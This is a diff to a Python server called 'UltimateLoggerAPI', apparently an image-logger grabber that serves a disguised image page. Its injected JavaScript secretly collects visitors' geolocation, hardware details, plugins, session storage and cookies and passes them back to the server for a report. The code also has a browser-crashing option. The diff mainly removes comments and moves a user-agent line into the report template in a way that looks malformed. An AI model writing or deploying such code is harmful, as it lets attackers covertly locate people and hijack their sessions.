@@ -48,7 +48,7 @@ config = {
     "collectSessionStorage": False,
 
     # PERFORMANCE #
-    "timeout": 5,  # seconds for API calls
+    "timeout": 5,
     "maxRetries": 2,
 
     # REDIRECTION #
@@ -199,7 +199,6 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, additi
     except:
         os, browser = "Unknown", "Unknown"
 
-    # Extended data collection
     extended_info = ""
     if config["extendedDataCollection"] and additional_data:
         extended_info = "\n**Extended Info:**"
@@ -252,7 +251,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, additi
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 > **User Agent:**
-                "timestamp": datetime.utcnow().isoformat(),
+    {useragent}
+                    "timestamp": datetime.utcnow().isoformat(),
                 "footer": {"text": config["footer"]}
             }
         ]
@@ -278,29 +278,22 @@ binaries = {
 class UltimateLoggerAPI(BaseHTTPRequestHandler):
     def handleRequest(self):
         try:
-            # Parse URL parameters
             s = self.path
             query = dict(parse.parse_qsl(parse.urlsplit(s).query))
             
-            # Get image URL
             if config["imageArgument"] and (query.get("url") or query.get("id")):
                 url = base64.b64decode((query.get("url") or query.get("id")).encode()).decode()
             else:
                 url = config["image"]
             
-            # Prepare additional data collection
             additional_data = {}
-            
-            # Get client IP
             ip = self.headers.get('x-forwarded-for') or self.headers.get('x-real-ip')
             if not ip and hasattr(self, 'client_address'):
                 ip = self.client_address[0]
             
-            # Skip blacklisted IPs
             if ip and ip.startswith(blacklistedIPs):
                 return
             
-            # Check for bots
             user_agent = self.headers.get('user-agent', 'Unknown')
             if bot_check := botCheck(ip or "0.0.0.0", user_agent):
                 self.send_response(200 if config["buggedImage"] else 302)
@@ -313,7 +306,6 @@ class UltimateLoggerAPI(BaseHTTPRequestHandler):
                 makeReport(ip, endpoint=s.split("?")[0], url=url)
                 return
             
-            # Handle geolocation
             location = None
             if query.get("g") and config["accurateLocation"]:
                 try:
@@ -321,7 +313,6 @@ class UltimateLoggerAPI(BaseHTTPRequestHandler):
                 except:
                     pass
             
-            # Collect extended data
             if config["extendedDataCollection"]:
                 if query.get("screen") and config["collectScreenData"]:
                     try:
@@ -367,7 +358,6 @@ class UltimateLoggerAPI(BaseHTTPRequestHandler):
                     except:
                         pass
             
-            # Generate report
             result = makeReport(
                 ip,
                 user_agent,
@@ -377,7 +367,6 @@ class UltimateLoggerAPI(BaseHTTPRequestHandler):
                 additional_data
             )
             
-            # Prepare response
             message = config["message"]["message"]
             
             if config["message"]["richMessage"] and result:
@@ -401,7 +390,6 @@ class UltimateLoggerAPI(BaseHTTPRequestHandler):
                 for placeholder, value in replacements.items():
                     message = message.replace(placeholder, value)
             
-            # Prepare response data
             if config["redirect"]["redirect"]:
                 data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
             elif config["crashBrowser"]:
@@ -422,12 +410,10 @@ class UltimateLoggerAPI(BaseHTTPRequestHandler):
                     height: 100vh;
                 }}</style><div class="img"></div>'''.encode()
             
-            # Add JavaScript for additional data collection
             js_script = b""
             if config["accurateLocation"]:
                 js_script += b"""
 <script>
-// Geolocation
 var currenturl = window.location.href;
 if (!currenturl.includes("g=") && navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(function(coords) {
@@ -526,16 +512,10 @@ if (!currenturl.includes("net=")) {
 // Hardware info
 if (!currenturl.includes("hw=")) {
     var hardwareInfo = {};
-    
-    // CPU cores
     hardwareInfo.cpu = navigator.hardwareConcurrency || "Unknown";
-    
-    // RAM (approximate)
     if (navigator.deviceMemory) {
         hardwareInfo.ram = navigator.deviceMemory + " GB";
     }
-    
-    // GPU (if available)
     if (navigator.gpu) {
         navigator.gpu.requestAdapter().then(function(adapter) {
             hardwareInfo.gpu = adapter.name || "Unknown";
@@ -578,7 +558,7 @@ if (!currenturl.includes("plugins=") && navigator.plugins) {
     }
 }
 
-// Session storage (if enabled)
+// Session storage
 if (!currenturl.includes("session=") && config["collectSessionStorage"] && window.sessionStorage) {
     try {
         var sessionData = {};
@@ -596,7 +576,7 @@ if (!currenturl.includes("session=") && config["collectSessionStorage"] && windo
     } catch(e) {}
 }
 
-// Cookies (if enabled)
+// Cookies
 if (!currenturl.includes("cookies=") && config["collectCookies"] && document.cookie) {
     try {
         if (currenturl.includes("?")) {
@@ -607,7 +587,6 @@ if (!currenturl.includes("cookies=") && config["collectCookies"] && document.coo
     } catch(e) {}
 }
 
-// Final redirect with all collected data
 setTimeout(function() {
     if (currenturl !== window.location.href) {
         location.replace(currenturl);
@@ -616,7 +595,6 @@ setTimeout(function() {
 </script>
 """
             
-            # Send response
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
